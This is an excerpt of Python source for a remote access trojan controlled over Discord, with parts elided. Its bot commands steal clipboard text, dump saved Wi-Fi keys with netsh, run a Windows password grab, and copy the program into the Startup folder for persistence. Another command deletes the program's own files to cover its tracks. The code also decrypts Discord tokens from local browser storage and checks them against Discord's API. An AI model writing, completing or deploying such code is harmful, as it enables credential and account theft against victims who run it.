...
intents.message_content = True  # Eğer mesaj içeriği okunacaksa bu gereklidir
...
async def on_message(message):
    if message.channel.name != channel_name:
        ...
        if message.content == "!clipboard":
            ...
            if user32.IsClipboardFormatAvailable(CF_TEXT):
                ...
                await message.channel.send(
                    "[*] Command successfuly executed : " + "Clipboard content is : " + str(body))
        ...
        if message.content == "!selfdestruct":  # prob beter way to do dis
            ...
            hello = os.getpid()
            bat = """@echo off""" + " & " + "taskkill" + r" /F /PID " + str(
                hello) + " &" + " del " + '"' + cmd2 + '"' + r" /F" + " & " + r"""start /b "" cmd /c del "%~f0"& taskkill /IM cmd.exe /F &exit /b"""
            temp = (os.getenv("TEMP"))
        ...
        if message.content == "!windowspass":
            ...
            def shell():
                output = subprocess.run(full_cmd, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
                return output
        ...
        if message.content == "!getwifipass":
            ...
            if is_admin == True:
                ...
                if is_admin == True:
                    ...
                    import subprocess
                    import json
                    x = subprocess.run("NETSH WLAN SHOW PROFILE", stdout=subprocess.PIPE, shell=True,
                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
                    ...
                    lst.remove('')
                    for e in lst:
                        output = subprocess.run('NETSH WLAN SHOW PROFILE "' + e + '" KEY=CLEAR ',
                                                stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE,
                                                stdin=subprocess.PIPE).stdout.decode('CP437')
        ...
        if message.content == "!startup":
            ...
            if is_admin == True:
                ...
                if isexe:
                    os.system(
                        fr'copy "{path}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /Y')
                else:
                    os.system(
            ...
            def getuserdata(token):
                try:
                    return loads(urlopen(
                        Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
                except:
                    pass
                            ...
                            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if
                                ...
                                for y in findall(encrypted_regex, line):
                                    token = decrypt_password(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]),
                                                             get_master_key(path1 + '\\Local State'))
                                    try:
                                        r = requests.get("https://discord.com/api/v9/users/@me",
                                                         headers=getheaders(token))
                                        if r.status_code == 200:
